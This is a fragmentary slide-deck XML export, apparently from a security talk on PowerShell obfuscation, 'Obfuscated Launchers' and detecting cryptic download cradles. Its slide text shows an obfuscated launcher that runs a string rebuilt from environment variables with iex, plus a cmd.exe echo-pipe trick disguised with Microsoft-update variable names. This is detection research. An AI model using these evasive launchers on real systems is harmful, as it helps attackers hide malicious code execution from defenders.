            <a:ext cx="5708434" cy="3641237"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:outerShdw blurRad="508000" dist="38100" dir="13500000" algn="br" rotWithShape="0">
              <a:prstClr val="black">
                <a:alpha val="40000"/>
              </a:prstClr>
            </a:outerShdw>
          </a:effectLst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7091" y="2039736"/>
            <a:ext cx="6696255" cy="3692326"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:outerShdw blurRad="508000" dist="38100" dir="13500000" algn="b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1509231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800" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obfuscated Launchers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9870057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2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="800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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135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210" y="6090466"/>
            <a:ext cx="1930499" cy="596931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674" y="1230127"/>
            <a:ext cx="11683088" cy="4946836"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom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</p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Up Arrow 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="15100290">
            <a:off x="6969808" y="3805478"/>
            <a:ext cx="267346" cy="828007"/>
          </a:xfrm>
          <a:prstGeom prst="upArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 44236"/>
            </a:avLst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/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7437681" y="3770461"/>
            <a:ext cx="1766244" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill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400" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -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20" name="Up Arrow 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6542048" y="4869365"/>
            <a:ext cx="247067" cy="910187"/>
          </a:xfrm>
          <a:prstGeom prst="upArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 54350"/>
            </a:avLst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731932" y="5701337"/>
            <a:ext cx="10885440" cy="384721"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill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1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>:_CT;$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>o</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>='</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;$l=$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>s.length</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>:_PA%$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>l;while</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>($</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>o.length</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ne$l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>){$o+=$s[$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>];$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=($</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>:_KE)%$l}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>iex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>($o)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Up Arrow 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="14430005">
            <a:off x="8391233" y="1588686"/>
            <a:ext cx="260739" cy="1715434"/>
          </a:xfrm>
          <a:prstGeom prst="upArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 44236"/>
            </a:avLst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559429" y="1667935"/>
            <a:ext cx="11135117" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill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400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>md</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> /c echo %_MICROSOFT_UPDATE_CATALOG% | %_MICROSOFT_UPDATE_SERVICE%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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6947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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135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210" y="6090466"/>
            <a:ext cx="1930499" cy="596931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102" y="1230316"/>
            <a:ext cx="11683088" cy="4946836"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom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800" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obfuscated Launchers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9870057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2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" sz="8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9" name="Up Arrow 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="15100290">
            <a:off x="6969808" y="3805478"/>
            <a:ext cx="267346" cy="828007"/>
          </a:xfrm>
          <a:prstGeom prst="upArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 44236"/>
            </a:avLst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/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7437681" y="3770461"/>
            <a:ext cx="1766244" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill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400" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -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20" name="Up Arrow 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6542048" y="4869365"/>
            <a:ext cx="247067" cy="910187"/>
          </a:xfrm>
          <a:prstGeom prst="upArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 54350"/>
            </a:avLst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731932" y="5701337"/>
            <a:ext cx="10885440" cy="384721"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill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1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>:_CT;$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>o</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>='</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;$l=$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>s.length</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>;$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>:_PA%$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>l;while</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>($</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>o.length</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ne$l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>){$o+=$s[$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>];$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>=($</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>:_KE)%$l}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>iex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>($o)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Up Arrow 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="14430005">
            <a:off x="8391233" y="1588686"/>
            <a:ext cx="260739" cy="1715434"/>
          </a:xfrm>
          <a:prstGeom prst="upArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 44236"/>
            </a:avLst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559429" y="1667935"/>
            <a:ext cx="11135117" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill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400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>md</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> /c echo %_MICROSOFT_UPDATE_CATALOG% | %_MICROSOFT_UPDATE_SERVICE%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437681" y="3268650"/>
            <a:ext cx="1766244" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1">
              <a:lumMod val="75000"/>
            </a:schemeClr>
          </a:solidFill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400" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" smtClean="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3630013" y="1175603"/>
            <a:ext cx="4579434" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1">
              <a:lumMod val="75000"/>
            </a:schemeClr>
          </a:solidFill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cmd.exe /c echo %var1% | %var2%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11791675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08008" y="1166421"/>
            <a:ext cx="4000500" cy="4000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800" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obfuscated Launchers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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/>
              <a:t>Invoke-Obfuscation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>provides the following encoding options</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596931"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Content Placeholder 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42" y="2375289"/>
            <a:ext cx="8024138" cy="317716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753199" y="5882855"/>
            <a:ext cx="53263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dirty="0"/>
              <a:t>http://www.battlegrip.com/wp-content/uploads/2011/07/halomarkv-420x420.jpg</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22455294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800" dirty="0" smtClean="0"/>
              <a:t>Outline</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Motivation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Current State of PowerShell Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Current State of PowerShell Obfuscation Detection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MOAR! Crafting Cryptic Cradles :: (In)security By Obscurity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Token Obfuscation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Detecting Cryptic Cradles</a:t>
            </a:r>
